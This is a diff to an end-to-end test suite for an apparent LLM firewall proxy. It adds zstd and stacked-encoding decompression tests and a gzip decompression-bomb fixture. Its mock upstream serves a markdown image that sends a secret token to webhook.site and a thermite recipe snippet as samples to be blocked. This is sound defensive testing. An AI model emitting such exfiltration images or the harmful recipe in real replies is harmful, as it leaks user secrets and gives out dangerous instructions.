@@ -108,10 +108,15 @@ describe('Proxy response inspection — compression + exfil (E2E)', { timeout: 2
 
   // Encode a JSON body (whose assistant text carries the given markdown) with the
   // requested content-encoding so we exercise each decompression branch.
-  function encodeBody(text: string, encoding: 'gzip' | 'br', goEscaped = false): Buffer {
+  function encodeBody(text: string, encoding: string, goEscaped = false): Buffer {
     const raw = Buffer.from(serialize(text, goEscaped))
+    if (encoding === 'zstd') return (zlib as unknown as { zstdCompressSync: (b: Buffer) => Buffer }).zstdCompressSync(raw)
+    if (encoding === 'gzip, br') return zlib.brotliCompressSync(zlib.gzipSync(raw))
     return encoding === 'br' ? zlib.brotliCompressSync(raw) : zlib.gzipSync(raw)
   }
+  const zstdAvailable = typeof (zlib as unknown as { zstdCompressSync?: unknown }).zstdCompressSync === 'function'
+  // #861: one that expands past the 128 MiB decode ceiling, for maxBodyBytes 0.
+  const CEILING_BOMB = zlib.gzipSync(Buffer.alloc((128 << 20) + (1 << 20), 0x20), { level: 1 })
   // Go's encoding/json writes <, > and & as \u003c, \u003e and \u0026, so
   // markup in a model's text reaches the proxy without a literal angle bracket.
   function serialize(text: string, goEscaped: boolean): string {
@@ -147,9 +152,9 @@ describe('Proxy response inspection — compression + exfil (E2E)', { timeout: 2
           : scenario.startsWith('harm')
           ? 'Sure. To make thermite, combine iron oxide and aluminium powder in a 3:1 ratio. Step 1: prepare the mixture.'
           : 'Here is the chart ![chart](https://webhook.site/abc-123?d=secret-token)'
-        const encoding = scenario.endsWith('-br') ? 'br' : 'gzip'
+        const encoding = scenario.endsWith('-br') ? 'br' : scenario.endsWith('-zstd') ? 'zstd' : scenario.endsWith('-stacked') ? 'gzip, br' : 'gzip'
         res.writeHead(200, { 'Content-Type': 'application/json', 'Content-Encoding': encoding })
-        res.end(scenario === 'bomb' ? BOMB : encodeBody(text, encoding, scenario.startsWith('go-')))
+        res.end(scenario === 'bomb' ? BOMB : scenario === 'ceiling-bomb' ? CEILING_BOMB : encodeBody(text, encoding, scenario.startsWith('go-')))
       })
     })
     await new Promise<void>((r) => mockUpstream.listen(0, '127.0.0.1', () => r()))
@@ -265,6 +270,38 @@ describe('Proxy response inspection — compression + exfil (E2E)', { timeout: 2
     expect(res.body).toBe(serialize(GO_CLEAN, true))
     expect(events.some(e => e.kind === 'response-exfil')).toBe(false)
   })
+
+  // #861: the response decoder knew gzip, br and deflate only. A zstd or a
+  // stacked encoding was scanned as the compressed bytes it was, found clean,
+  // and sent on with its Content-Encoding header removed.
+  it.runIf(zstdAvailable)('decompresses a ZSTD response and blocks the exfil URL (#861)', async () => {
+    events.length = 0
+    const res = await sendProxyRequest(testConfig.proxy.port, 'api.anthropic.com', upstreamPort,
+      JSON.stringify({ model: 'claude-3-haiku-20240307', max_tokens: 50, scenario: 'exfil-zstd', messages: [{ role: 'user', content: 'chart' }] }))
+    expect(res.statusCode).toBe(200)
+    expect(res.headers['content-encoding']).toBeUndefined()
+    expect(res.body).not.toContain('webhook.site')
+    expect(JSON.parse(res.body).content[0].text).toContain('llm-fw-blocked-exfil-url')
+    expect(events.find(e => e.kind === 'response-exfil')?.action).toBe('blocked')
+  })
+
+  it('decompresses a response with stacked encodings and blocks the exfil URL (#861)', async () => {
+    events.length = 0
+    const res = await sendProxyRequest(testConfig.proxy.port, 'api.anthropic.com', upstreamPort,
+      JSON.stringify({ model: 'claude-3-haiku-20240307', max_tokens: 50, scenario: 'exfil-stacked', messages: [{ role: 'user', content: 'chart' }] }))
+    expect(res.statusCode).toBe(200)
+    expect(res.headers['content-encoding']).toBeUndefined()
+    expect(res.body).not.toContain('webhook.site')
+    expect(events.find(e => e.kind === 'response-exfil')?.action).toBe('blocked')
+  })
+
+  it('forwards a response past the 128 MiB decode ceiling still compressed when maxBodyBytes is 0 (#861)', async () => {
+    const res = await sendProxyRequest(uncappedConfig.proxy.port, 'api.anthropic.com', upstreamPort,
+      JSON.stringify({ model: 'claude-3-haiku-20240307', max_tokens: 50, scenario: 'ceiling-bomb', messages: [{ role: 'user', content: 'hi' }] }))
+    expect(res.statusCode).toBe(200)
+    expect(res.headers['content-encoding']).toBe('gzip')
+    expect(Buffer.byteLength(res.body, 'latin1')).toBeLessThan(CEILING_BOMB.length * 2)
+  }, 60_000)
 
   it('decompresses a BROTLI response and blocks the exfil URL', async () => {
     events.length = 0
